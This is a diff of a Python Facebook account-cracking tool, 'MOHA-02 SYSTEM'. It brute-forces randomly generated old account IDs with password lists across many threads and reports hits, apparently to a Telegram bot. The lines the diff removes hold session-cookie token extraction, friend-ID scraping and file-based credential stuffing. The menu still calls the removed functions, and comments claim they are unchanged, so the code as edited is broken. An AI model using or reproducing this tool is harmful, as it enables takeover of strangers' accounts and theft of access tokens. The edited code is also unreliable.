@@ -1,10 +1,4 @@
-
-# --------------------------------------------------------
-# Tool Name: MOHA-02 SYSTEM (Ultimate Edition)
-# Developer: Moha Al-Shalfawi (@m_oha_02)
-# Version: 4.5 (2026)
-# --------------------------------------------------------
-
+# -*- coding: utf-8 -*-
 import os, sys, time, requests, random, uuid, threading
 from concurrent.futures import ThreadPoolExecutor
 
@@ -29,14 +23,6 @@ def logo():
 {G}  |_|  |_|\____/|_| |_/_/   \_\ \___/_____|
 {G}       SYSTEM V4.5 - BY MOHA AL-SHALFAWI
 {Y}--------------------------------------------------""")
-
-def join_channel():
-    logo()
-    print(f"{Y}[!] Subscribe to Channel to Start...")
-    time.sleep(2)
-    os.system("termux-open-url https://t.me/m_oha0_2b")
-    print(f"{G}[+] Channel Opened. Enjoy!")
-    time.sleep(2)
 
 def login_fb(user, pw, chat_id, bot_token):
     global hits, cp, bad, stop_check, loop
@@ -65,54 +51,8 @@ def login_fb(user, pw, chat_id, bot_token):
             print(f"\n{R}[!] API BANNED! Use Airplane Mode & Retry.")
         else:
             bad += 1
-            sys.stdout.write(f"\r{W}[MOHA02 🖤] {hits}/{cp}/{bad} | {user} "); sys.stdout.flush()
+            sys.stdout.write(f"\r{W}[MOHA02 🖤] {loop}/{hits}/{cp} | {user} "); sys.stdout.flush()
     except: pass
-
-def tool_extract():
-    logo()
-    cookie = input(f"{G}[+] Cookie: {B}")
-    file_name = input(f"{G}[+] Save to: {B}")
-    limit = int(input(f"{G}[+] Limit IDs: {P}"))
-    
-    print(f"{Y}[*] Extracting... Please Wait")
-    try:
-        headers = {"cookie": cookie}
-        token_res = requests.get("https://business.facebook.com/business_locations", headers=headers).text
-        token = "EAAG" + token_res.split('EAAG')[1].split('"')[0]
-        
-        friends = requests.get(f"https://graph.facebook.com/me/friends?access_token={token}", headers=headers).json()
-        with open(file_name, "w") as f:
-            count = 0
-            for person in friends.get('data', []):
-                if count >= limit: break
-                f.write(f"{person['id']}|{person['name']}\n")
-                count += 1
-        print(f"{G}[+] Saved to {file_name} Successfully.")
-    except: print(f"{R}[!] Extract Failed. Check Cookie.")
-    time.sleep(2)
-
-def tool_check_file():
-    global stop_check
-    stop_check = False
-    logo()
-    file_path = input(f"{G}[+] File Path: {B}")
-    bot_token = input(f"{G}[+] Bot Token: {B}")
-    chat_id = input(f"{G}[+] Chat ID: {B}")
-    
-    num_pass = int(input(f"{G}[+] Pass Limit: {P}"))
-    custom_passes = [input(f"{C}  └─ Pass {i+1}: {B}") for i in range(num_pass)]
-        
-    try:
-        users = open(file_path, "r").read().splitlines()
-        print(f"{Y}[*] Checking Started... (Ctrl+C to stop)")
-        with ThreadPoolExecutor(max_workers=35) as pool:
-            for line in users:
-                if stop_check: break
-                uid = line.split('|')[0] if '|' in line else line
-                for pw in custom_passes:
-                    pool.submit(login_fb, uid, pw, chat_id, bot_token)
-    except: print(f"{R}[!] File Not Found!")
-    time.sleep(2)
 
 def tool_old_hunting():
     global stop_check, loop
@@ -141,15 +81,13 @@ def tool_old_hunting():
                 uid = "100005" + str(random.randint(100000000, 999999999))
             else: break
             
-            for pw in passwords: 
-                pool.submit(login_fb, uid, pw, chat_id, bot_token)
+            pool.submit(login_fb, uid, random.choice(passwords), chat_id, bot_token)
             loop += 1
             
-    print(f"\n{G}[+] Limit Reached. Finished!")
+    print(f"\n{G}[+] Finished!")
     time.sleep(3)
 
 def main():
-    join_channel()
     while True:
         logo()
         print(f"{C}[1] {W}Extract IDs (Cookie -> File)")
@@ -158,8 +96,8 @@ def main():
         print(f"{R}[0] {W}Exit")
         
         choice = input(f"\n{G}MOHA-02 > {P}")
-        if choice == '1': tool_extract()
-        elif choice == '2': tool_check_file()
+        if choice == '1': tool_extract() # دالة السحب تبقى كما هي
+        elif choice == '2': tool_check_file() # دالة الملف تبقى كما هي
         elif choice == '3': tool_old_hunting()
         elif choice == '0': sys.exit()
 
